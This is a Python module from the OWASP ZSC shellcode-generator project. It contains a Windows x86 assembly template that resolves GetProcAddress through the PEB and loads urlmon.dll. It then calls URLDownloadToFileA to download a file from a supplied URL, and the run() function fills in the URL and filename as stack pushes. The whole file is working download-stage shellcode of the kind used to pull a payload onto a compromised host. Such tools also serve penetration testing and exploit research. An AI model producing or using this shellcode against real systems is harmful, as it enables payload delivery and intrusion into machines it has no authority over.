#!/usr/bin/env python
'''
OWASP ZSC
https://www.owasp.org/index.php/OWASP_ZSC_Tool_Project
https://github.com/zscproject/OWASP-ZSC
http://api.z3r0d4y.com/
https://groups.google.com/d/forum/owasp-zsc [ owasp-zsc[at]googlegroups[dot]com ]
'''
from core import stack


def download_tofile(url, filename):
    return '''
xor    %ecx,%ecx
mov    %fs:0x30(%ecx),%eax
mov    0xc(%eax),%eax
mov    0x14(%eax),%esi
lods   %ds:(%esi),%eax
xchg   %eax,%esi
lods   %ds:(%esi),%eax
mov    0x10(%eax),%ebx
mov    0x3c(%ebx),%edx
add    %ebx,%edx
mov    0x78(%edx),%edx
add    %ebx,%edx
mov    0x20(%edx),%esi
add    %ebx,%esi
xor    %ecx,%ecx
inc    %ecx
lods   %ds:(%esi),%eax
add    %ebx,%eax
cmpl   $0x50746547,(%eax)
jne    23 <.text+0x23>
cmpl   $0x41636f72,0x4(%eax)
jne    23 <.text+0x23>
cmpl   $0x65726464,0x8(%eax)
jne    23 <.text+0x23>
mov    0x24(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,2),%cx
dec    %ecx
mov    0x1c(%edx),%esi
add    %ebx,%esi
mov    (%esi,%ecx,4),%edx
add    %ebx,%edx
xor    %esi,%esi
mov    %edx,%esi
xor    %ecx,%ecx
push   %ecx
push   $0x41797261
push   $0x7262694c
push   $0x64616f4c
push   %esp
push   %ebx
call   *%edx
xor    %ecx,%ecx
mov    $0x6c6c,%cx
push   %ecx
push   $0x642e6e6f
push   $0x6d6c7275
push   %esp
call   *%eax
xor    %ecx,%ecx
push   %ecx
mov    $0x4165,%cx
push   %ecx
push   $0x6c69466f
push   $0x5464616f
push   $0x6c6e776f
push   $0x444c5255
mov    %esp,%ecx
push   %ecx
push   %eax
call   *%esi
xor    %ecx,%ecx
push   %ecx
{0}
xor    %edi,%edi
mov    %esp,%edi
xor    %ecx,%ecx
push   %ecx
{1}
xor    %edx,%edx
mov    %esp,%edx
xor    %ecx,%ecx
push   %ecx
push   %ecx
push   %edx
push   %edi
push   %ecx
call   *%eax
xor    %ecx,%ecx
push   %ecx
push   $0x73736590
pop    %ecx
shr    $0x8,%ecx
push   %ecx
push   $0x636f7250
push   $0x74697845
push   %esp
push   %ebx
call   *%esi
xor    %ecx,%ecx
push   %ecx
call   *%eax
'''.format(url, filename)


def run(data):
    url = data[0]
    filename = data[1]
    return download_tofile(
        stack.generate(url, "%ecx", "string"), stack.generate(filename, "%ecx",
                                                              "string"))
